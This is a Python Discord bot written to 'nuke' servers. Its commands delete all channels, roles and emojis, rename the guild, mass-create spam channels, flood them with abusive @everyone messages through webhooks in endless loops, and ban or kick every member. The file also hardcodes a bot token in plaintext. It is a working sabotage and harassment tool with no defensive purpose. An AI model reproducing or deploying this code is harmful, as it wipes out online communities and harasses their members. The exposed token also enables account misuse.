import os
import discord
from discord import Webhook
from discord.ext import commands
import random
import asyncio
import aiohttp

# Rest of the code...

CHANNEL_NAMES = [
    "nuked-by-naju", "nuked-by-naju", "nuked-by-naju"
]
NAJU_OP = ["NUKED"]
SPAM_MESSAGE = [
    "@everyone nuked by naju man", "@everyone DESTROYED",
    '@everyone EAT YOUR MOMMY ASS ',
    "@everyone YOU ALL ARE DISGUSTING PIECE OF SHITS"
]
WEBHOOK_NAMES = [
    'uppa', 'girlfriend', 'mia', 'roket', 'andimon', 'Itsmeandi',
    '_', 'purr kathik'
]

intents = discord.Intents.all()
client = commands.Bot(command_prefix=".", intents=intents)


@client.event
async def on_ready():
    print('''╔╗─╔╗──╔╗
║║─║║──║║
║╚═╝╠╗╔╣║╔╦══╦═╗
║╔═╗║║║║╚╝╣║═╣╔╝
║║─║║╚╝║╔╗╣║═╣║
╚╝─╚╩══╩╝╚╩══╩╝'''
          f"Logged as {client.user}")


@client.command()
async def nuke(ctx, amount=500):
    await ctx.message.delete()
    await ctx.guild.edit(name="ANDI FOR SALE")
    guild = ctx.guild
  
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            pass
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
        except:
            pass
          
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass
          
    for i in range(1000):
        for i in range(10000):
            for channel in ctx.guild.channels:
                try:
                    await channel.send(random.choice(SPAM_MESSAGE))
                except:
                    pass
                  
    for member in ctx.guild.members:
        
            try:
                await member.ban(reason="Beamed")
            except:
                pass


@client.command()
async def kickall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.kick(reason="beamed")
        except:
            pass


@client.command()
@commands.is_owner()
async def online(ctx):
    await client.change_presence(status=discord.Status.online)
    await ctx.message.delete()


@client.command()
@commands.is_owner()
async def offline(ctx):
    await client.change_presence(status=discord.Status.offline)
    await ctx.message.delete()


@client.command()
async def spamca(ctx):
    await ctx.message.delete()
    while True:
        await ctx.guild.create_category(name=f"{NAJU_OP}")
        await ctx.guild.create_category(name=f"{NAJU_OP}")
        await ctx.guild.create_category(name=f"{NAJU_OP}")
        await ctx.guild.create_category(name=f"{NAJU_OP}")
        await ctx.guild.create_category(name=f"{NAJU_OP}")
        await ctx.guild.create_category(name=f"{NAJU_OP}")
        await ctx.guild.create_category(name=f"{NAJU_OP}")
        await ctx.guild.create_category(name=f"{NAJU_OP}")
        await ctx.guild.create_category(name=f"{NAJU_OP}")


@client.command()
async def banall(ctx):
    await ctx.message.delete()
    for user in ctx.guild.members:
        try:
            await user.ban()
        except:
            pass


@client.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name=random.choice(WEBHOOK_NAMES))
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))
        await webhook.send(random.choice(SPAM_MESSAGE),
                           username=random.choice(WEBHOOK_NAMES))


token = ("MTA5NjkzNjg1NDU2MzA3NDEzOA.GzPdey.GNB_MTOfKUorYsctvFcL6cZS1maDkDLQLZXiZg")
client.run(token)
